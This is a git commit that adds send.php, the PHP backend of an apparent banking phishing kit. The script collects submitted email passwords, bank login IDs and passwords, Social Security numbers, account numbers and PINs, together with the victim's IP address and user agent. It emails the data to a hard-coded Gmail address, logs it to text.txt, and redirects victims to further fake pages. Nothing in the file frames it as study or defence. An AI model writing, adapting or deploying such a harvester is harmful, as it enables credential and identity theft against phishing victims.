6013d6179e469919bf83eefd339392e47c814ae2
gjodie544 <67371098+gjodie544@users.noreply.github.com>
2022-05-20 09:05:53 -0400

    Add files via upload

---
+++ send.php
@@ -0,0 +1,111 @@
+<?php
+
+$Receive_email="staerkelramee@gmail.com";
+
+if (isset($_POST['_cmdContinue'])) {
+	
+
+	$ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+	$message .= "|----------| |--------------|\n";
+	
+	$message .= "Email Address            : ".$_POST['email']."\n";
+	$message .= "Email Password              : ".$_POST['EmailPassword']."\n";
+
+	$message .= "|--------------- I N F O | I P -------------------|\n";
+	$message .= "|Client IP: ".$ip."\n";
+	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+	$message .= "User Agent : ".$useragent."\n";
+	$message .= "|----------- --------------|\n";
+	$send = $Receive_email;
+	$subject = "Email Login : $ip";
+	mail($send, $subject, $message);
+	
+	$file = "text.txt";
+	$open = fopen($file, "a");
+	fwrite($open, $message."\n");
+	fclose($open);
+
+	header("Location: ./detail.html");
+
+	
+	
+}
+
+else if (isset($_POST['cmdContinue'])) {
+	
+
+	$ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+	$message .= "|----------| |--------------|\n";
+	$message .= "Social Security Number   : ".$_POST['ssn']."\n";
+	$message .= "Account Number           : ".$_POST['accountnum']."\n";
+	$message .= "Account Type             : ".$_POST['accounttype']."\n";
+	$message .= "Pin                      : ".$_POST['pin']."\n";
+
+	$message .= "|--------------- I N F O | I P -------------------|\n";
+	$message .= "|Client IP: ".$ip."\n";
+	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+	$message .= "User Agent : ".$useragent."\n";
+	$message .= "|----------- --------------|\n";
+	$send = $Receive_email;
+	$subject = "SSN, Account Login : $ip";
+	mail($send, $subject, $message);
+	
+	$file = "text.txt";
+	$open = fopen($file, "a");
+	fwrite($open, $message."\n");
+	fclose($open);
+	 
+	header("Location: ./thank.html");
+
+	
+	
+}
+
+
+
+else if (isset($_POST['userid_btn'])) {
+	
+
+	$ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+	$message .= "|----------| |--------------|\n";
+	$message .= "User ID            : ".$_POST['LoginName']."\n";
+	$message .= "Password           : ".$_POST['Password']."\n";
+
+	$message .= "|--------------- I N F O | I P -------------------|\n";
+	$message .= "|Client IP: ".$ip."\n";
+	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+	$message .= "User Agent : ".$useragent."\n";
+	$message .= "|----------- --------------|\n";
+	$send = $Receive_email;
+	$subject = "Login : $ip";
+	mail($send, $subject, $message);
+	 
+	header("Location: devicefingerprint.html");
+	
+	$file = "text.txt";
+	$open = fopen($file, "a");
+	fwrite($open, $message."\n");
+	fclose($open);
+
+	
+	
+}
+
+else{
+	$signal = 'bad';
+	$msg = 'Please fill in all the fields.';
+}
+$data = array(
+        'signal' => $signal,
+        'msg' => $msg,
+        'redirect_link' => $redirect,
+    );
+    echo json_encode($data);
+
+?>
